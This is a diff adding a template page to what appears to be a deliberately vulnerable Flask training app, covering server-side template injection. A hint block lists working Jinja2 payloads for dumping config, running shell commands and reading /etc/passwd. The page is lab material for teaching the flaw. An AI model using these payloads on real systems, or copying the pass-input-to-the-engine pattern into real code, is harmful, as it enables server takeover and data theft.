@@ -1,0 +1,45 @@
+{% extends "base.html" %}
+
+{% block title %}SSTI - Vulnerable App{% endblock %}
+
+{% block content %}
+<div class="card">
+    <h2>📝 Server-Side Template Injection (SSTI)</h2>
+    <span class="vulnerability-tag">CRITICAL</span>
+    <span class="vulnerability-tag">CWE-1336</span>
+    
+    <p>Render a template. User input is passed directly to the template engine.</p>
+    
+    <form method="POST" style="margin-top: 1rem;">
+        <label for="template">Template (Jinja2):</label>
+        <textarea id="template" name="template" rows="4" placeholder="Hello {{ '{{' }} name {{ '}}' }}">{{ "Hello {{ 7*7 }}" }}</textarea>
+        <button type="submit">Render Template</button>
+    </form>
+    
+    <div class="hint">
+        <strong>💡 SSTI Payloads for Jinja2:</strong>
+        <pre>
+{{ "{{" }} 7*7 {{ "}}" }}                              {# Returns: 49 #}
+{{ "{{" }} config {{ "}}" }}                          {# Dump Flask config #}
+{{ "{{" }} config.items() {{ "}}" }}                  {# All config items #}
+
+{# RCE via SSTI #}
+{{ "{{" }} ''.__class__.__mro__[1].__subclasses__() {{ "}}" }}
+{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[408]('id', shell=True, stdout=-1).communicate() {{ "}}" }}
+
+{# Read files #}
+{{ "{{" }} ''.__class__.__mro__[1].__subclasses__()[40]('/etc/passwd').read() {{ "}}" }}
+
+{# Using request object #}
+{{ "{{" }} request.application.__globals__.__builtins__.__import__('os').popen('id').read() {{ "}}" }}
+        </pre>
+    </div>
+    
+    {% if output %}
+    <div class="result">
+        <h3>Output:</h3>
+        <pre>{{ output }}</pre>
+    </div>
+    {% endif %}
+</div>
+{% endblock %}
